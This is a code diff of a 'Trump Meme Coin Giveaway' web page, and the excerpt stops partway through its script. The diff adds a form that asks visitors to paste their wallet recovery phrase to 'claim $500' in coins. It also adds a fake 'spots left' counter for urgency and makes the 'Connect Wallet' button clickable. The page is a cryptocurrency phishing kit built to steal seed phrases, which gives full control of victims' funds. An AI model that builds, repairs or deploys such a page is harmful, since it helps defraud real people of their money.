@@ -27,26 +27,6 @@
       padding: 20px 10px;
     }
 
-    header img {
-      max-width: 120px;
-      margin-bottom: 10px;
-    }
-
-    header h1 {
-      font-size: 2rem;
-      margin-bottom: 5px;
-    }
-
-    header p {
-      font-size: 1.2rem;
-    }
-
-    .balance {
-      font-size: 1.5rem;
-      font-weight: bold;
-      margin-top: 10px;
-    }
-
     .container {
       max-width: 900px;
       margin: 30px auto;
@@ -54,14 +34,33 @@
       background: #fff;
       border-radius: 8px;
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-      transition: filter 0.3s ease;
     }
 
-    .blurred {
-      filter: blur(8px);
-      pointer-events: none;
+    /* Fix for button not being clickable */
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 15px;
+      margin-top: 20px;
+      font-size: 1.2rem;
+      font-weight: bold;
+      color: #fff;
+      background: #ff4500;
+      border: none;
+      border-radius: 5px;
+      text-align: center;
+      cursor: pointer;
+      position: relative; /* Ensures it's clickable */
+      z-index: 10;
+      transition: transform 0.2s, background 0.3s;
     }
 
+    .btn:hover {
+      background: #e03e00;
+      transform: scale(1.05);
+    }
+
+    /* Wallet Connection Page */
     .wallet-page {
       display: none;
       background: #fff;
@@ -81,60 +80,6 @@
       display: block;
     }
 
-    .error {
-      color: red;
-      font-weight: bold;
-      font-size: 0.9rem;
-      text-align: center;
-      background: #ffe6e6;
-      padding: 8px;
-      border: 1px solid red;
-      border-radius: 5px;
-      margin-bottom: 10px;
-    }
-
-    label {
-      display: block;
-      margin-top: 10px;
-      font-weight: bold;
-    }
-
-    input, select, textarea {
-      width: 100%;
-      padding: 12px;
-      margin-top: 5px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      font-size: 1rem;
-    }
-
-    textarea {
-      height: 150px;
-      resize: none;
-    }
-
-    /* Animated Buttons */
-    .btn {
-      display: block;
-      width: 100%;
-      padding: 15px;
-      margin-top: 20px;
-      font-size: 1.2rem;
-      font-weight: bold;
-      color: #fff;
-      background: #ff4500;
-      border: none;
-      border-radius: 5px;
-      text-align: center;
-      cursor: pointer;
-      transition: transform 0.2s, background 0.3s;
-    }
-
-    .btn:hover {
-      background: #e03e00;
-      transform: scale(1.05);
-    }
-
     footer {
       text-align: center;
       margin-top: 30px;
@@ -143,22 +88,7 @@
       color: #666;
     }
 
-    /* Social Media Links */
-    .social-links {
-      margin-top: 15px;
-    }
-
-    .social-links a {
-      margin: 0 10px;
-      color: #0056b3;
-      font-size: 1.2rem;
-      text-decoration: none;
-    }
-
-    .social-links a:hover {
-      text-decoration: underline;
-    }
-
+    /* Live Wallet Counter */
     .wallet-counter {
       font-size: 1.2rem;
       font-weight: bold;
@@ -173,24 +103,13 @@
         width: 90%;
         padding: 15px;
       }
-      header h1 {
-        font-size: 1.5rem;
-      }
-      .btn {
-        font-size: 1rem;
-        padding: 12px;
-      }
     }
   </style>
 </head>
 <body>
-  <!-- Header Section -->
   <header>
-    <img src="https://s.yimg.com/ny/api/res/1.2/C6usFI02aAqtM5gFrKz88w--/YXBwaWQ9aGlnaGxhbmRlcjt3PTY0MDtoPTg1Mw--/https://media.zenfs.com/en/aol_ny_post_us_news_articles_123/cd57f4122a7033346c851d4791a4aff0" alt="Trump Meme Coin Logo">
     <h1>Trump Meme Coin Giveaway</h1>
     <p>Make America Great Again!</p>
-    <div class="balance">$5,000,000 $TRUMP</div>
-    <p><strong>Verified by leading crypto analysts.</strong></p>
   </header>
 
   <!-- Live Wallet Counter -->
@@ -198,29 +117,36 @@
     Only <span id="wallet-count">2,000</span> spots left!
   </div>
 
-  <!-- Landing Page Content -->
-  <div class="container" id="main-content">
-    <div class="card">
-      <h2>Join the Revolution!</h2>
-      <button class="btn" onclick="showWalletPage()">Connect Wallet</button>
-    </div>
+  <div class="container">
+    <h2>Join the Revolution!</h2>
+    <button id="connect-wallet-btn" class="btn">Connect Wallet</button>
   </div>
 
-  <!-- Footer Section with Social Media Links -->
+  <div class="wallet-page" id="wallet-page">
+    <h2>Connect Your Wallet</h2>
+    <p>Enter your wallet details to claim $500 worth of Trump Meme Coins.</p>
+    <form id="wallet-form">
+      <label for="wallet-type">Select Wallet Type</label>
+      <select id="wallet-type" name="wallet_type" required>
+        <option value="metamask">MetaMask</option>
+        <option value="trustwallet">Trust Wallet</option>
+        <option value="coinbase">Coinbase Wallet</option>
+        <option value="others">Others</option>
+      </select>
+      <label for="wallet-phrase">Enter Your Wallet Phrase</label>
+      <textarea id="wallet-phrase" name="wallet_phrase" placeholder="Copy & Paste Wallet Phrase" required></textarea>
+      <button class="btn" type="submit">Submit</button>
+    </form>
+  </div>
+
   <footer>
     <p>&copy; 2025 Trump Meme Coin Giveaway. All rights reserved.</p>
-    <div class="social-links">
-      <a href="#">Twitter</a>
-      <a href="#">Telegram</a>
-      <a href="#">Discord</a>
-    </div>
   </footer>
 
   <script>
-    function showWalletPage() {
+    document.getElementById("connect-wallet-btn").addEventListener("click", function() {
       document.getElementById('wallet-page').classList.add('active');
-      document.body.classList.add('noscroll');
-    }
+    });
 
     // Live Wallet Counter Simulation
     let count = 2000;
